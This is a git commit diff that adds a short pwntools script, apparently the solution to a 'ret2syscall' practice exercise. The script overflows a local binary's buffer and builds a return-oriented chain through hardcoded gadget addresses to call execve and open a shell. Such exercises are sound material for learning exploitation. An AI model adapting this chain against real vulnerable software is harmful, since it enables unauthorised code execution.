f9258234f10ff8d4a710440c34481b9ef1d80175
张靖昆 <55184183+tobbykun@users.noreply.github.com>
2023-11-19 13:41:13 +0800

    Update payload.py

--- ret2syscall/payload.py
+++ ret2syscall/payload.py
@@ -1,1 +1,11 @@
+from pwn import *
 
+sh = process('./ret2syscall')
+eax_ret = 0x080bb196
+edx_ecx_ebx_ret = 0x0806eb90
+int_0x80 = 0x08049421
+bin_sh = 0x080be408
+sh.sendline(b'a' * 0x70 + p32(eax_ret) + p32(0xb) + 
+           p32(edx_ecx_ebx_ret) + p32(0) + p32(0) + 
+           p32(bin_sh) + p32(int_0x80))
+sh.interactive()
